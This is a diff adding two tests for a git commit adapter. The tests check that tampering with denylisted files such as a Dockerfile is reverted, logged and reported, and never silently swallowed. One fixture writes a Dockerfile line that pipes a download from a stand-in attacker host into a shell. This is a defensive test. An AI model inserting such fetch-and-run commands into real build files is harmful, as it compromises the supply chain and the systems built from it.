@@ -183,6 +183,62 @@ test("real git fixture: a legitimate file RENAMED into a denylisted destination 
   }
 });
 
+// ── FIX 3 (sdd/security-hardening, judgment-day round 2, HIGH, both judges) — the revert must
+// never be silent: a supply-chain tamper reverted underneath a run must leave a trace (logged
+// loudly) and be surfaced to the caller (returned) so it can be threaded into gateSignals.
+// confinement — a run must never reach verdict:pass/auto-merge with a silently-reverted tamper.
+
+test("commit() logs loudly AND returns the reverted denylisted paths when a tamper is detected (never silent)", async () => {
+  const repo = initRepo();
+  const originalConsoleError = console.error;
+  const errorLogs: unknown[][] = [];
+  console.error = (...args: unknown[]) => { errorLogs.push(args); };
+  try {
+    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\n");
+    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
+    execFileSync("git", ["add", "-A"], { cwd: repo });
+    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });
+
+    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
+    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); // legitimate control (survives the revert)
+
+    const adapter = new VcsWriteAdapter(realGitFn(repo));
+    const result = await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);
+
+    assert.deepEqual(result.revertedDenylisted, ["Dockerfile"], "the reverted denylisted paths must be returned to the caller, not swallowed");
+    assert.ok(
+      errorLogs.some((args) => args.some((a) => typeof a === "string" && a.includes("Dockerfile"))),
+      `a reverted tamper must be logged loudly (console.error) — logs: ${JSON.stringify(errorLogs)}`,
+    );
+  } finally {
+    console.error = originalConsoleError;
+    rmSync(repo, { recursive: true, force: true });
+  }
+});
+
+test("commit() returns an empty revertedDenylisted array (never logs) when nothing was denylisted", async () => {
+  const repo = initRepo();
+  const originalConsoleError = console.error;
+  const errorLogs: unknown[][] = [];
+  console.error = (...args: unknown[]) => { errorLogs.push(args); };
+  try {
+    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
+    execFileSync("git", ["add", "-A"], { cwd: repo });
+    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });
+
+    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n");
+
+    const adapter = new VcsWriteAdapter(realGitFn(repo));
+    const result = await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);
+
+    assert.deepEqual(result.revertedDenylisted, []);
+    assert.equal(errorLogs.length, 0, "a clean commit must never log a tamper warning");
+  } finally {
+    console.error = originalConsoleError;
+    rmSync(repo, { recursive: true, force: true });
+  }
+});
+
 test("real git fixture: a legitimate tracked-modified (M status) file survives — the guard never over-reverts a non-denylisted path", async () => {
   const repo = initRepo();
   try {
